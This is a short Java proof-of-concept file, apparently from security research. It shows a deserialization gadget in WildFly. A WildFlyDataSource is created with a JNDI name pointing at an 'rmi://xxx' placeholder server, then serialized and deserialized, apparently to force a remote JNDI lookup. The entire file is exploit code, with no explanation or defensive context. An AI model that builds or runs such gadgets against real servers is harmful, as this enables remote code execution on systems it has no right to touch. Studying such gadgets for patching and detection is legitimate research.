package com.example.WildFly;

import com.example.Utils.SerializeUtil;
import org.jboss.as.connector.subsystems.datasources.WildFlyDataSource;

public class POC_1 {

    public static void main(String[] args) throws Exception {
        WildFlyDataSource wildFly = new WildFlyDataSource(null, "rmi://xxx");
        SerializeUtil.deserialize(SerializeUtil.serialize(wildFly));
    }

}
